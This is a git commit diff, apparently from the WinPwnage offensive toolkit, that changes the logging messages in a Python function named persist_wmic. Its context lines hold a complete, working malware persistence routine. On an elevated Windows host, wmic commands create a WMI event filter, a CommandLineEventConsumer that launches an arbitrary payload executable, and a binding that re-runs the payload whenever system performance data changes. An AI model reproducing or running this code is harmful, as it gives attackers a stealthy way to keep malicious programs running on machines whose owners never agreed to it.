c61296fee5cacc8f8a477f5498a857900fb42724
rootm0s <rickardmalmkvist@hotmail.com>
2018-09-14 08:42:29 +0200

    x
    x

--- functions/persist_wmic.py
+++ functions/persist_wmic.py
@@ -22,21 +22,29 @@ def persist_wmic(payload):
 	if (payloads().exe(payload) == True):
 		if (information().admin() == True):
 			if (process().create("wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='WinPwnageFilter', EventNameSpace='root\\cimv2',QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",0) == True):
-				print_success("WinPwnageFilter done")
+				print_success("Successfully created __EventFilter")
 			else:
+				print_error("Unable to create event filter")
 				print False
+				
 			time.sleep(3)
+			
 			if (process().create("wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WinPwnageConsumer', ExecutablePath='{}',CommandLineTemplate='{}'".format(os.path.join(payload),os.path.join(payload)),0) == True):
-				print True
+				print_success("Successfully created CommandLineEventConsumer")
 			else:
+				print_error("Unable to create CommandLineEventConsumer")
 				print False	
+				
 			time.sleep(3)
+			
 			if (process().create("wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='WinPwnageFilter'', Consumer='CommandLineEventConsumer.Name='WinPwnageConsumer''",0) == True):
-				print True
+				print_success("Successfully created __FilterToConsumerBinding")
 			else:
+				print_error("Unable to create __FilterToConsumerBinding")
 				print False
 		else:
 			print_error("Unable to proceed, we are not elevated")
+			return False
 	else:
 		print_error("Cannot proceed, invalid payload")
-		return False				
+		return False							
